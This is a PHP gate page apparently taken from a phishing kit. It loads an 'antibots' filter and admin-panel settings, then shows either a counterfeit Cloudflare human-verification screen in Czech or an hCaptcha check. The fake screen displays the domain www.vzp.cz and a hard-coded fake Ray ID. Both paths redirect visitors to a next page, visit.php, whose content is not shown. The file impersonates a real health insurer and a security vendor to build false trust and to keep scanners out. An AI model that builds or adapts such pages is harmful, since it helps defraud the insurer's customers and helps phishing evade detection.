<?php
include "./antibots-debug/antibots.php";
$jsonFilePath = "./panel/admin/admin.json";
$json_data = file_get_contents($jsonFilePath);
$settings_data = json_decode($json_data, true);
$recaptcha_mode = $settings_data['recaptcha_mode'];
$recaptcha_type = $settings_data['recaptcha_type'];

if ($recaptcha_mode === 0 && $recaptcha_type === "off-type") {
    echo 
    "<script>
        window.location = './visit.php';
    </script>";
}

elseif ($recaptcha_mode === 1 && $recaptcha_type === "cloudflare") {
    $cloudflare ='<!DOCTYPE html>
        <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Recaptcha - Überprüfung</title>
                <style>

                    * {
                        font-family: Arial, Helvetica, sans-serif;
                        margin: 0px;
                        padding: 0px;
                        box-sizing: border-box;
                    }

                    body {
                        background-color: #222222;
                        display: flex;
                        flex-direction: column;
                        justify-content: space-between;
                        align-items: center;
                        width: 100%;
                        height: 100vh;
                    }

                    .container {
                        margin-left: auto;
                        margin-right: auto;
                        padding-left: 15px;
                        padding-right: 15px;
                    }

                    /* Small */
                    @media (min-width: 768px) {
                        .container {
                            width: 750px;
                        }
                    }

                    /* Medium */
                    @media (min-width: 992px) {
                        .container {
                            width: 970px;
                        }
                    }

                    /* Large */
                    @media (min-width: 1200px) {
                        .container {
                            width: 1170px;
                        }
                    }

                    .recaptcha {
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        width: 100%;
                        height: 100vh;
                    }

                    .recaptcha .content-recaptcha {
                        display: flex;
                        flex-direction: column;
                        justify-content: flex-start;
                        align-items: flex-start;
                        width: 100%;
                        margin: auto;
                    }

                    .recaptcha .content-recaptcha h1 {
                        font-size: 25px;
                        font-weight: bold;
                        line-height: 3.75rem;
                        color: #d9d9d9;
                        margin-bottom: 15px;
                        width: 100%;
                    }

                    .recaptcha .content-recaptcha .p-explain-one {
                        color: #d9d9d9;
                        font-size: 19px;
                        line-height: 2.25rem;
                        font-weight: 500;
                        width: 100%;
                    }

                    .recaptcha .content-recaptcha .p-explain-two {
                        color: #d9d9d9;
                        font-size: 19px;
                        line-height: 2.25rem;
                        font-weight: 500;
                        width: 100%;
                    }

                    .recaptcha .content-recaptcha .checking-not-robot {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        width: 300px;
                        max-width: 100%;
                        border: 1px solid #666;
                        background-color: #222;
                        padding: 0px 10px;
                        margin: 30px 0px;
                        position: relative;
                    }

                    .recaptcha .content-recaptcha .checking-not-robot .parent-input-check-box {
                        display: flex;
                        justify-content: flex-start;
                        align-items: center;
                    }

                    .recaptcha .content-recaptcha .checking-not-robot .parent-input-check-box label {
                        font-size: 14px;
                        font-weight: 400;
                        width:162px;
                        color: #fff;
                        line-height: 1.5;
                        padding-left: 10px;
                        cursor: pointer;
                    }

                    .recaptcha .content-recaptcha .checking-not-robot .parent-logo img {
                        width: 90px;
                    }
                    
                    .recaptcha .content-recaptcha .checking-not-robot .parent-input-check-box .parent-animation {
                        position: absolute;
                        left: 4px;
                        top: 7px;
                        background-color: #222;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                    }

                    .recaptcha .content-recaptcha .checking-not-robot .parent-input-check-box .parent-animation img {
                        width: 40px;
                        animation: rotate 5s linear infinite; 
                    }

                    /* Keyframes for continuous rotation */
                    @keyframes rotate {
                        from {
                            transform: rotate(0deg);
                        }
                        to {
                            transform: rotate(360deg);
                        }
                    }

                    .input-checkbox {
                        width: 27px;
                        height: 27px;
                        -moz-appearance: none;
                        -webkit-appearance: none;
                        appearance: none;
                        border: 2px solid #fff;
                        border-radius: 2px;
                        vertical-align: middle;
                        position: relative;
                        outline: 0px;
                    }

                    .input-checkbox:checked {
                        background-color: #222222 !important;
                    }
                    
                    .input-checkbox:checked:before {
                        content: "\2714";
                        position: absolute;
                        width: 100%;
                        height: 100%;
                        left: 0px;
                        font-size: 15px;
                        padding: 0;
                        vertical-align: middle;
                        color: #f6821f;
                        font-weight: bold;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                    }

                    .footer-recaptcha {
                        width: 100%;
                    }

                    .footer-recaptcha .content-footer-recaptcha {
                        border-top: 1px solid #d9d9d9;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                        padding-bottom: 1rem;
                        padding-top: 1rem;
                    }

                    .footer-recaptcha .content-footer-recaptcha span {
                        color: #d9d9d9;
                        font-size: 13px;
                        margin-bottom: 10px;
                    }

                    .footer-recaptcha .content-footer-recaptcha p {
                        color: #d9d9d9;
                        font-size: 13px;
                    }
                    
                    .hidden {
                        display: none !important;
                    }
                </style>
            </head>
            <body>
                <div class="recaptcha">
                    <div class="container">
                        <div class="content-recaptcha">
                            <h1>www.vzp.cz</h1>
                            <p class="p-explain-one" id="pExplainOne">
                                Potvrďte, že jste člověk provedením následující akce.
                            </p>
                            <div class="checking-not-robot" id="parentChecking">
                                <div class="parent-input-check-box">
                                    <input type="checkbox" name="checkbox" class="input-checkbox" id="checkbox">
                                    <label for="checkbox" id="textExplain">Uznej, že jsi člověk</label>
                                    <div class="parent-animation hidden" id="animationElement">
                                        <img src="./panel/img/animation-first.png">
                                    </div>
                                </div>
                                <div class="parent-logo">
                                    <img src="./panel/img/logo-recaptcha.png" alt="">
                                </div>
                            </div>

                            <p class="p-explain-two" id="pExplainTwo">www.vzp.cz musíte před pokračováním ověřit zabezpečení vašeho připojení.</p>
                        </div>
                    </div>
                </div>

                <div class="footer-recaptcha">
                    <div class="container">
                        <div class="content-footer-recaptcha">
                            <span>Ray ID: <code>8b0247f5fcad1537</code></span>
                            <p>Výkon &amp; Zabezpečení prostřednictvím Cloudflare</p>
                        </div>
                    </div>

                </div>

                <script>
                    const checkbox = document.getElementById("checkbox");
                    const textExplain = document.getElementById("textExplain");
                    const animationElement = document.getElementById("animationElement");
                    const parentChecking = document.getElementById("parentChecking");
                    
                    
                    setTimeout(function() {
                        animationElement.classList.add("hidden");
                        textExplain.innerText = "Uznej, že jsi člověk";
                    }, 5000);

                    checkbox.addEventListener("click", ()=>{
                        animationElement.classList.remove("hidden");
                        textExplain.innerText = "Ověřování...";
                        setTimeout(function() {
                            window.location = "./visit.php";
                        }, 3000);
                    });
                </script>


            </body>
        </html>';

    echo $cloudflare;
}

elseif ($recaptcha_mode === 1 && $recaptcha_type === "hcaptcha") {
    $hcaptcha = 
    '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Zkouška</title>
            <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/4201/4201973.png" />
            <link rel="stylesheet" href="./css/global-rules.css">
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
            <script src="https://www.hCaptcha.com/1/api.js" async defer></script>

        </head>
        <body class="">
            <div class="nav-bar-first">
                <div class="logo">
                    <img src="./img/logo.png" alt="">
                </div>
            </div>
        
            <div class="parent-checking">
                <h1>Zkouška</h1>
                <div class="h-captcha" data-sitekey="d94b46f4-dff1-430b-a0bd-d04acdf38fa9" data-callback="onSubmit"></div>
                <div class="error-message" id="error-message"></div>
            </div>
            <script>
                function onSubmit(response) {
                    $.ajax({
                        url: "./panel/actions/verify.php",
                        type: "POST",
                        data: {
                            "h-captcha-response": response
                        },
                        success: function(data) {
                            if (data === "success") {
                                window.location.href = "visit.php";
                            } else {
                                $("#error-message").html("Please verify you are not a robot");
                            }
                        },
                        error: function() {
                            $("#error-message").html("An error occurred, please try again");
                        }
                    });
                }
            </script>
        </body>
        </html>';
    echo $hcaptcha;
}
?>